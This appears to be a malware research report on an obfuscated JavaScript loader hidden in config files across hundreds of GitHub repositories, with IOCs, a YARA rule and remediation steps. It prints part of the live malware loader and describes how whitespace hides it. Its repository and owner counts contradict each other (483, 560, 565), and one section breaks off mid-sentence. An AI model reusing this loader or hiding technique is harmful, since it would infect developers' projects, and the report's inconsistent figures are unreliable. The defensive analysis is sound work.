# PolinRider: DPRK threat actor implants malware in 560 GitHub repositories 

**Date:** 2026-03-07
**Research:** [OpenSourceMalware.com](https://opensourcemalware.com)
**Query:** [`rmcej%otb%` on GitHub Code Search](https://github.com/search?q=rmcej%25otb%25&ref=opensearch&type=code)
**Severity:** High — active supply chain infection across 483 public repositories

---

## Technical Details

The [OpenSourceMalware](https://opensourcemalware.com) team has uncovered an ongoing campaign
A threat actor


## Scope of Attack

A malicious obfuscated JavaScript payload identified by the string `rmcej%otb%` has been found injected into legitimate JavaScript config files across **560 public GitHub repositories** belonging to **301 unique owners**.

The payload is appended to the end of real project config files — silently, after the file's legitimate content — making it easy to miss during casual code review. The primary infection vector appears to be a compromised npm package that executes during install or build and injects itself into config files in the project root.

> **Data note:** GitHub's code search API caps results at 1,000 per query. This dataset was collected by running one query per known infected filename via `gh search code`, then deduplicating. `index.js` returned no results from the search run. Additional filenames may yield further affected repos.

---

## Impact Statistics

| Metric | Count |
|--------|-------|
| Unique repositories infected | 565 |
| Unique owners affected | 303 |
| Total stars across infected repos | 179 |
| Total forks across infected repos | 87 |
| Total followers across affected owners | 2,475 |

---

## Infected File Types

| File | Occurrences |
|------|------------:|
| `postcss.config.mjs` | 416 |
| `tailwind.config.js` | 71 |
| `eslint.config.mjs` | 67 |
| `next.config.mjs` | 13 |
| `App.js` | 13 |
| `app.js` | 2 |

The dominance of `postcss.config.mjs` (416 of 560 repos, ~74%) strongly points to a compromised PostCSS or Tailwind CSS-adjacent npm package as the primary infection vector.

---

## Payload Analysis

### Injection Pattern

The payload is appended after the legitimate file content, preceded by a large block of whitespace to push it off-screen. Example from `postcss.config.mjs` in `brown2020/ikigaifinder`:

```js
/** @type {import('postcss-load-config').Config} */
const config = {
  plugins: {
    '@tailwindcss/postcss': {},
  },
};

export default config;
                                        [~200 spaces]
global['!']='4-1422';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);...
```

### Stage 1 — String Shuffle Cipher

The marker string `rmcej%otb%` is passed through a character-shuffle function with numeric seed `2857687`. The shuffle produces a decoded string array used to:

- Store `require` in `global['!']` (bypasses static analysis looking for `require`)
- Store `module` in a global variable
- Bootstrap a dynamic second-stage loader

### Stage 2 — Dynamic Code Construction

A second obfuscated function (`sfL`) with seed `2667686` decodes a long encoded string (`joW`) into JavaScript source, which is then passed to `Function()` (constructed dynamically to avoid static detection) and executed.

The second-stage payload (partially decoded) performs network callbacks, file system operations, and environment variable exfiltration consistent with an **infostealer / initial access trojan**.

### Key Obfuscation Techniques

- Character-shuffle cipher with hardcoded numeric seeds
- `global['!']` aliasing of `require` to evade static analysis
- Large horizontal whitespace block (100+ spaces) before injected payload to hide it below the visible editor viewport
- Multi-stage loading — each stage decodes and executes the next
- Legitimate file content preserved in full to avoid breaking the project build

---

## Likely Infection Vector

Given that:

1. `postcss.config.mjs` accounts for 74% of infections
2. Affected repos span a wide range of unrelated projects and owners
3. The injection appears automated and consistent across all files
4. The file content before the payload is always legitimate and valid

The most probable vector is a **malicious npm package** (likely in the PostCSS/Tailwind ecosystem) that runs a postinstall script or hooks into the build process to inject the payload into config files in the working directory. The developer's own committed config file then becomes the persistence mechanism, spreading the payload to anyone who clones the repo.

Possible package categories to investigate:
- PostCSS plugins
- Tailwind CSS plugins or utilities
- Build tooling wrappers (Next.js utilities, Vite plugins)
- Developer productivity packages with broad install bases

---

## Outreach Prioritisation

The full CSVs are sorted by impact for triage.

### Top Repos by Stars + Forks

| Repository | Stars | Forks | Infected File |
|------------|------:|------:|---------------|
| `Codechef-VITC-Student-Chapter/Club-Integration-and-Management-Platform` | 6 | 11 | `postcss.config.mjs` |
| `Victorola-coder/tewo` | 9 | 6 | `tailwind.config.js` |
| `Atik203/Scholar-Flow` | 4 | 4 | `postcss.config.mjs` |
| `coderkhalide/Anti-Detect-Browser` | 2 | 4 | `postcss.config.mjs` |
| `WeerasingheMSC/ASMS_Frontend` | 1 | 4 | `postcss.config.mjs` |
| `fsdteam8/n_Krypted-frontend` | 0 | 4 | `postcss.config.mjs` |
| `Kreliannn/Document-Request-System-FRONTEND` | 8 | 1 | `postcss.config.mjs` |
| `tanushbhootra576/Bionary-Website-Challenge-and-final` | 4 | 2 | `postcss.config.mjs` |
| `sparktechagency/Vap-shop-Front-End-` | 7 | 0 | `postcss.config.mjs` |
| `Kreliannn/PDF-To-Reviewer-Quiz-FRONTEND` | 7 | 0 | `postcss.config.mjs` |

### Top Owners by Follower Count

| Owner | Followers | Repos Affected |
|-------|----------:|---------------:|
| `coderkhalide` | 349 | 4 |
| `finom` | 172 | 3 |
| `sparktechagency` | 130 | 12 |
| `Victorola-coder` | 121 | 1 |
| `dhruvmalik007` | 87 | 6 |
| `a-belard` | 43 | 1 |
| `Muhammadfaizanjanjua109` | 39 | 1 |
| `Nathanim1919` | 38 | 5 |
| `kanchana404` | 33 | 3 |
| `AKDebug-UX` | 30 | 3 |

> **Priority targets:** `sparktechagency` (130 followers, 12 repos) is the highest-volume owner. `coderkhalide` (349 followers, 4 repos) has the widest direct reach.

---

## Indicators of Compromise (IOCs)

### Static Signatures

| Type | Value |
|------|-------|
| String marker | `rmcej%otb%` |
| Global alias | `global['!']='4-1422'` |
| Cipher seed 1 | `2857687` |
| Cipher seed 2 | `2667686` |
| Variable prefix | `_$_1e42` |

### Behavioural Indicators

- `require` aliased to `global['!']` at runtime
- `Function()` called with dynamically constructed string argument
- Config files contain content after `export default` / `module.exports`
- Large horizontal whitespace block (100+ spaces) before injected payload

### YARA Rule (Suggested)

```yara
rule rmcej_otb_payload {
    meta:
        description = "Detects rmcej%otb% shuffle-cipher JS payload injected into config files"
        author = "OpenSourceMalware.com"
        date = "2026-03-07"
        severity = "high"

    strings:
        $marker   = "rmcej%otb%"
        $global   = "global['!']"
        $seed1    = "2857687"
        $seed2    = "2667686"
        $varname  = "_$_1e42"

    condition:
        $marker or ($global and $seed1) or ($varname and $seed2)
}
```

---

## Recommended Actions

**For affected repo owners:**
1. Audit all JS config files (`postcss.config.*`, `tailwind.config.*`, `eslint.config.*`, `next.config.*`) for content appearing after `export default` or `module.exports`
2. Review `package.json` dependencies — particularly any recently added or updated PostCSS/Tailwind-related packages
3. Check `node_modules` for postinstall scripts: `grep -r "postinstall" node_modules/*/package.json`
4. Rotate any secrets, tokens, or credentials that may have been present in the environment during a build
5. Force-push clean config files and consider signing commits going forward

**For security tooling / registries:**
- Add YARA/regex rule for `rmcej%otb%` to static analysis pipelines
- Flag packages with postinstall scripts that write to project root config files
- Cross-reference affected repo owners against recently published npm packages

---

## Data Collection

Data was collected using the GitHub Code Search API via `gh search code`, running one query per infected filename to work around the 1,000-result-per-query cap. Results were deduplicated by repository full name.

| Filename searched | Results |
|-------------------|--------:|
| `postcss.config.mjs` | 416 |
| `tailwind.config.js` | 71 |
| `eslint.config.mjs` | 67 |
| `App.js` | 15 |
| `next.config.mjs` | 13 |
| `index.js` | 6 |
| **Total (pre-dedup)** | **588** |
| **Unique repos** | **565** |

---

## Files

| File | Description |
|------|-------------|
| `rmcej-otb-threat-report.md` | This report |
| `affected_repos.csv` | All 565 affected repositories with owner, stars, forks, file paths, and URLs — sorted by stars+forks descending |
| `affected_users.csv` | All 303 affected owners with follower count, public repo count, and affected repo links — sorted by followers descending |

---

## References

- GitHub Code Search: https://github.com/search?q=rmcej%25otb%25&ref=opensearch&type=code
- OpenSourceMalware.com: https://opensourcemalware.com

---

*Research conducted using the GitHub Code Search API. Data collected 2026-03-07.*
